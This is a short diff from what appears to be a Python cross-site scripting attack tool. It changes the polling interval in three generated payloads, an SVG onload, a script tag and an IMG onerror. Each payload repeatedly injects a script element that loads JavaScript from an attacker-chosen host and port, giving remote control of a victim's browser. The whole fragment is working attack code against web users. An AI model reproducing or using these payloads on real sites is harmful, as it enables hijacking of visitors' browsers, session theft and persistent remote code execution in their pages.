@@ -50,9 +50,9 @@ gene = args.gene
 cmd = format(args.command)
 secs = int(format(args.secs))
 payload = '''
- - SVG: %s<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},999)>
-%s - SCRIPT: %s<script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},999)</script>
-%s - IMG: %s<img src=x onerror=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},999)>
+ - SVG: %s<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1010)>
+%s - SCRIPT: %s<script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1010)</script>
+%s - IMG: %s<img src=x onerror=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1010)>
 
 ''' % (blue, host, port, white, blue, host, port, white, blue, host, port)
 
